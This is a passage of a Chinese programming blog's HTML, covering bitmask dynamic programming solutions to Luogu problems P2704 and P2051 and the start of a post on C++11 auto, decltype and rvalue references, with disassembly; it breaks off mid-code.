+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222194252888.png" alt="image-20221222194252888"></p>
+<p><strong>可见一个将军和一个炮的区别就是,将军只有一级影响,炮还有二级影响</strong></p>
+<p>P1879这个题中要安排一行时,只需要考虑上一行给这一行造成的一级影响.</p>
+<p>本题中除了一级影响,还要考虑二级影响,因此本题可以看作P1879的推广,</p>
+<h3 id="状态转移-3"><a href="#状态转移-3" class="headerlink" title="状态转移"></a>状态转移</h3><p>原来的状态<code>dp[current_row][current_state]</code>表示1到<code>current_row</code>行已经安排完毕,其中<code>current_state</code>是第<code>current_row</code>行的状态,也就是对<code>current_row+1</code>行的”一级影响”</p>
+<p>因此拓展到有二级影响的情况,应该这样设置状态<code>dp[current_row][current_state][previous_state]</code>,意思是</p>
+<p>当前已经安排好了1到<code>current_row</code>行,</p>
+<p>第<code>current_row</code>行的状态是<code>current_state</code>,</p>
+<p>第<code>previous_row=current_row-1</code>行的状态是<code>previous_state</code></p>
+<p><code>dp[current_row][current_state][previous_state]</code>等于在前述三个条件下得到的最大炮兵数量<br>$$<br>当前状态的最大炮兵数&#x3D;max(枚举与当前行不冲突的上一行状态的最大炮兵数+当前行状态贡献的炮兵数)<br>$$</p>
+<p>状态转移方程就是:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dp[current_row][current_state][previous_state]=<span class="built_in">max</span>(</span><br><span class="line">	dp[previous_row][previous_state][preprevious_state]+cnt_of_cannons_in_state[current_state];</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">110</span>;<span class="comment">//最大行数</span></span><br><span class="line"><span class="type">int</span> n,m;<span class="comment">//n行,m列</span></span><br><span class="line"><span class="type">int</span> row_limit_state;<span class="comment">//一行的最大状态</span></span><br><span class="line"><span class="type">int</span> row_base_state[maxn];<span class="comment">//一行中的地形状态,row_base_state[i]为第i行的地形状态</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; row_legal_states[maxn];<span class="comment">//只看一行时,该行的所有合法摆放炮兵的状态集合,row_legal_states[i]为第i行所有可以摆放的状态</span></span><br><span class="line"><span class="type">int</span> cnt_max_cannons;<span class="comment">//记录最大炮兵数量</span></span><br><span class="line"><span class="type">int</span> dp[maxn][<span class="number">1025</span>][<span class="number">1025</span>];</span><br><span class="line"><span class="type">int</span> cnt_cannons_in_state[<span class="number">1025</span>];<span class="comment">//cnt_cannons_in_state[state]表示当一行的炮兵状态为state时,放了几个炮兵</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;<span class="comment">//n行m列</span></span><br><span class="line">    <span class="comment">// if(n)</span></span><br><span class="line">    <span class="type">int</span> single_state;<span class="comment">//输入char类型的地形转换成0或者1表示的地形</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> terrain;<span class="comment">//存放地形输入</span></span><br><span class="line"></span><br><span class="line">    row_limit_state=(<span class="number">1</span>&lt;&lt;m)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;++row_state)&#123;<span class="comment">//预处理cnt_cannons_in_state数组</span></span><br><span class="line">        <span class="type">int</span> row_temp_state=row_state;</span><br><span class="line">        <span class="type">int</span> cnt_cannons=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(row_temp_state)&#123;</span><br><span class="line">            cnt_cannons+=row_temp_state&amp;<span class="number">1</span>;<span class="comment">//不停右移直到降为0,只关心最低为有没有1</span></span><br><span class="line">            row_temp_state&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt_cannons_in_state[row_state]=cnt_cannons;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> row=<span class="number">1</span>;row&lt;=n;row++)&#123;</span><br><span class="line">        <span class="type">int</span> row_state=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">1</span>;col&lt;=m;++col)&#123;</span><br><span class="line">            cin&gt;&gt;terrain;</span><br><span class="line">            <span class="keyword">if</span>(terrain==<span class="string">&#x27;P&#x27;</span>)&#123;</span><br><span class="line">                single_state=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                single_state=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            row_state=row_state*<span class="number">2</span>+single_state;</span><br><span class="line">        &#125;</span><br><span class="line">        row_base_state[row]=row_state;<span class="comment">//保存地形状态</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//立刻计算基于当前行的地形状态,可以得出的所有合法的炮兵摆放状态</span></span><br><span class="line">        <span class="keyword">for</span>(row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;row_state++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                (row_state&amp;(((row_state&lt;&lt;<span class="number">1</span>)|(row_state&lt;&lt;<span class="number">2</span>)|(row_state&gt;&gt;<span class="number">1</span>)|(row_state&gt;&gt;<span class="number">2</span>) )&amp;row_limit_state)   )==<span class="number">0</span><span class="comment">//这个炮兵的摆放状态不能自相冲突</span></span><br><span class="line">                &amp;&amp;</span><br><span class="line">                (row_state&amp;((~row_base_state[row])&amp;row_limit_state))==<span class="number">0</span><span class="comment">//这个炮兵的摆放状态要满足地形要求</span></span><br><span class="line">            )&#123;</span><br><span class="line">                row_legal_states[row].<span class="built_in">push_back</span>(row_state);</span><br><span class="line">                <span class="comment">// cout&lt;&lt;row_state&lt;&lt;endl;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    row_legal_states[<span class="number">0</span>].<span class="built_in">push_back</span>(<span class="number">0</span>);<span class="comment">//一定要这个初始化,第二行会查第0行的合法状态</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:row_legal_states[<span class="number">1</span>])&#123;<span class="comment">//第一行需要特殊处理,因为第一行往前看两行不存在第-1行,不能作为数组下标</span></span><br><span class="line">        dp[<span class="number">1</span>][current_state][<span class="number">0</span>]=cnt_cannons_in_state[current_state];</span><br><span class="line">        cnt_max_cannons=<span class="built_in">max</span>(cnt_max_cannons,dp[<span class="number">1</span>][current_state][<span class="number">0</span>]);<span class="comment">//一定不要忘记统计只有一行时的最大炮兵数量,测试点11专门卡这个</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_row=<span class="number">2</span>;current_row&lt;=n;++current_row)&#123;<span class="comment">//第二行往前看两行正好是第0行,下标访问正常</span></span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;<span class="comment">//上一行行号</span></span><br><span class="line">        <span class="keyword">auto</span> preprevious_row=previous_row<span class="number">-1</span>;<span class="comment">//上两行行号</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:row_legal_states[current_row])&#123;<span class="comment">//枚举当前行合法状态</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_state:row_legal_states[previous_row])&#123;<span class="comment">//枚举上一行合法状态</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> preprevious_state:row_legal_states[preprevious_row])&#123;<span class="comment">//枚举上两行合法状态</span></span><br><span class="line">                    <span class="keyword">if</span>(</span><br><span class="line">                        (previous_state &amp; preprevious_state)==<span class="number">0</span><span class="comment">//前两行的炮兵不能打架</span></span><br><span class="line">                        &amp;&amp;</span><br><span class="line">                        (current_state&amp;(previous_state|preprevious_state))==<span class="number">0</span><span class="comment">//本行和前两行的炮兵不能打架</span></span><br><span class="line">                    )&#123;</span><br><span class="line">                        dp[current_row][current_state][previous_state]=<span class="built_in">max</span>(<span class="comment">//状态转移方程</span></span><br><span class="line">                            dp[current_row][current_state][previous_state],</span><br><span class="line">                            dp[previous_row][previous_state][preprevious_state]+cnt_cannons_in_state[current_state]</span><br><span class="line">                        );</span><br><span class="line">                        cnt_max_cannons=<span class="built_in">max</span>(cnt_max_cannons,dp[current_row][current_state][previous_state]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for(auto current_state:row_legal_states[n])&#123;</span></span><br><span class="line">    <span class="comment">//     cnt_max_cannons=max(cnt_max_cannons,dp[n])</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    cout&lt;&lt;cnt_max_cannons&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="P2051-八中象炮"><a href="#P2051-八中象炮" class="headerlink" title="P2051 八中象炮"></a><a target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2051">P2051 八中象炮</a></h2><p>在一个$n\times m$的棋盘上,任意放中象的炮,要求任意两个炮不能相互攻击,随便放炮,问最多有多少种放法</p>
+<p>啥时候能炮打炮?一条水平或者竖直线上有仨个以上的炮就要打炮了</p>
+<p>因此就问题转化为,$n\times m$个方格,每行每列可以有0或者1或者2个石头,求有多少种摆放方法</p>
+<h3 id="状态压缩-4"><a href="#状态压缩-4" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>我最初的想法是,每行,每列都记录已经放过几个石头,然后直接深搜</p>
+<p>dfs(x,y)是当前要在第x行第y列放石头,首先判断能否放石头,如果能则尝试放上石头然后下一步深搜.</p>
+<p>不管能不能放石头,都要有一个直接下一步深搜</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">9999973</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> cnt_on_col[maxn];</span><br><span class="line"><span class="type">int</span> cnt_on_row[maxn];</span><br><span class="line"><span class="type">int</span> cnt_result=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(<span class="type">int</span> y,<span class="type">int</span> x)</span></span>&#123;<span class="comment">//第y行,第x列</span></span><br><span class="line">    <span class="keyword">if</span>(y&lt;=n&amp;&amp;x&gt;m)&#123;</span><br><span class="line">        <span class="built_in">DFS</span>(y<span class="number">+1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y&gt;n)&#123;</span><br><span class="line">        cnt_result=(cnt_result<span class="number">+1</span>)%mod;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt_on_col[x]&lt;<span class="number">2</span>&amp;&amp;cnt_on_row[y]&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        ++cnt_on_col[x];</span><br><span class="line">        ++cnt_on_row[y];</span><br><span class="line">        <span class="built_in">DFS</span>(y,x<span class="number">+1</span>);</span><br><span class="line">        --cnt_on_col[x];</span><br><span class="line">        --cnt_on_row[y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DFS</span>(y,x<span class="number">+1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="built_in">DFS</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;cnt_result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果就三个测试点过了,其他全都TLE</p>
+<p>狗屁状压,<code>dp[i][j][k]</code>表示前i行中的列,有一个炮的列有j个,有两个炮的列有k个</p>
+<p>完事</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/21/C++11%E7%89%B9%E6%80%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/21/C++11%E7%89%B9%E6%80%A7/" class="post-title-link" itemprop="url">C++11特性</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-12-21 22:48:00 / Modified: 22:48:58" itemprop="dateCreated datePublished" datetime="2022-12-21T22:48:00+08:00">2022-12-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="C-11特性"><a href="#C-11特性" class="headerlink" title="C++11特性"></a>C++11特性</h1><p>迈向现代的第一步</p>
+<p>2011年的C++标准,叫c++11</p>
+<p>使用gcc编译时,加入编译选项-std&#x3D;c++11即可使用c++11特性</p>
+<h2 id="类型推导"><a href="#类型推导" class="headerlink" title="类型推导"></a>类型推导</h2><p>auto&amp;decltype</p>
+<h3 id="auto"><a href="#auto" class="headerlink" title="auto"></a>auto</h3><p><code>auto 左值=右值;</code></p>
+<p>通过右值的类型推断auto代表的左值类型,必须得有右值才能用auto定义左值</p>
+<p>一般用于循环时作为迭代器,比如在解释器遍历符号表时</p>
+<p>在lexer.hpp中有这么一个内置符号表</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lexer.hpp</span></span><br><span class="line"><span class="type">static</span> std::vector&lt;Token&gt; build_in_token_table = &#123;</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;PI&quot;</span>, <span class="number">3.1415926</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;E&quot;</span>, <span class="number">2.71828</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">	...</span><br><span class="line">    &#123;DRAW, <span class="string">&quot;DRAW&quot;</span>, <span class="number">0.0</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在lexer.cpp中有一个queryTokenTable函数,根据参数字符串查找内置符号表,如果找到相应符号返回<strong>其引用</strong></p>
+<p>传统的方法是定义一个循环变量i,遍历整个符号表</p>
+<p>如果使用auto则更加方便,foreach循环</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lexer.cpp</span></span><br><span class="line"><span class="type">static</span> Token* <span class="title function_">queryTokenTable</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> &amp;lexme)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;build_in_table_token:build_in_token_table)&#123;<span class="comment">//此处一定是auto &amp;,是个引用类型,否则会拷贝构造新对象</span></span><br><span class="line">        <span class="keyword">if</span>(build_in_table_token.getLexme()==lexme)&#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;build_in_table_token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的是auto &amp;,而不是auto,之前我认为auto既然是自动的,应该可以推导出引用类型.</p>
+<p>然而实际上不会,auto会忽略引用类型还有cv属性,因此这里需要手工加上引用类型</p>
+<h3 id="decltype"><a href="#decltype" class="headerlink" title="decltype"></a>decltype</h3><p>decltype关键字是用于定义同类型变量,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">decltype(a) b=<span class="number">2</span>;</span><br><span class="line">decltype(a+b) c=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>decltype和auto不同的是,decltype完全拷贝其操作数的类型,包括引用和cv属性</p>
+<p>对于<code>decltype(expression)</code>,这里expression如果是函数调用,则decltype与函数返回值类型相同</p>
+<h2 id="右值引用"><a href="#右值引用" class="headerlink" title="右值引用"></a>右值引用</h2><h3 id="右值引用-1"><a href="#右值引用-1" class="headerlink" title="右值引用"></a>右值引用</h3><p>通常getter方法是这样定义的:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">x</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">y</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其返回值是一个右值,当调用语句结束后,返回值立刻死亡</p>
+<p>实际上大多数调用约定(这里是cdecl),函数的返回值放到rax寄存器中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int x=point.x();</span><br></pre></td></tr></table></figure>
+
+<p>该行源代码的最后的指令可能是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call point.x()</span><br><span class="line">mov [rbp+x],rax</span><br></pre></td></tr></table></figure>
+
+<p>意味着需要在调用者栈帧中给左值int a开4字节空间,然后将函数返回值(存在于rax寄存器)付给他</p>
+<p>之后rax的任务就完成了,可以立刻用于其他计算,这就意味着函数返回值这个将亡值不复存在了</p>
+<p>显然栈中是找不到这个返回值的,他只会临时存在于寄存器中</p>
+<p>右值引用的作用是,在调用者栈帧中给返回值开辟一块空间,将该返回值放到这块空间中,此后在调用者中就可以引用”右值”了,实际上是引用的返回值在调用者栈帧中的拷贝,这一点可以通过反编译观察</p>
+<p>比如如下程序</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x=<span class="number">0</span>,<span class="type">int</span> _y=<span class="number">0</span>):__x(_x),__y(_y)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> __x;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> __y;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Point <span class="title">A</span><span class="params">(<span class="number">2</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> &amp;&amp;x=A.<span class="built_in">x</span>();<span class="comment">//注意此处的x是右值引用</span></span><br><span class="line">    <span class="type">int</span> y=A.<span class="built_in">y</span>();<span class="comment">//注意此处的y是普通变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++11 main.cpp -O0 -o main </span><br></pre></td></tr></table></figure>
+
+<p>然后用ida64反编译观察之</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+A]	</span><br><span class="line">mov     ecx, eax	;this指针</span><br><span class="line">call    __ZN5Point1xEv  ; Point::x(void)</span><br><span class="line">mov     [ebp+var_10], eax	;返回值首先拷贝给var_10</span><br><span class="line">lea     eax, [ebp+var_10]	</span><br><span class="line">mov     [ebp+x], eax		;然后拷贝给x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea     eax, [ebp+A]</span><br><span class="line">mov     ecx, eax	;this</span><br><span class="line">call    __ZN5Point1yEv  ; Point::y(void)</span><br><span class="line">mov     [ebp+y], eax	;返回值直接拷贝给y</span><br></pre></td></tr></table></figure>
+
+<p>有一个明显区别,</p>
+<p><code>int &amp;&amp;x=A.x();</code>这里貌似在调用者栈帧中产生了两个局部变量,<code>var_10</code>和<code>x</code></p>
+<p>但是<code>int y=A.y();</code>只产生了一个局部变量<code>y</code></p>
+<p>显然x和y两个变量是地位相等,门当户对的</p>
+<p>这个<code>var_10</code>就是右值的拷贝,其存在的目的就是代理右值,使其可以进行取地址运算,实际上取得地址是<code>var_10</code>的地址</p>
+<p>问题又来了,这样看,使用右值引用的时候多产生了一个局部变量,并且需要四条指令,而不使用右值引用只需要两条指令.那用了个寂寞啊,越用越慢是吧.</p>
+<p>这是因为这里的调用情况是很简单的,有些复杂情况,var_10会发挥重要作用,详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/caojianfa969/article/details/118927852">右值引用</a></p>
+<h3 id="完美转发"><a href="#完美转发" class="headerlink" title="完美转发"></a>完美转发</h3><p>没看明白</p>
+<h3 id="返回值优化"><a href="#返回值优化" class="headerlink" title="返回值优化"></a>返回值优化</h3><p>类似于传参时是直接传递引用还是调用拷贝构造函数给形参赋值</p>
+<p>返回时也面临相似的局面,比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span 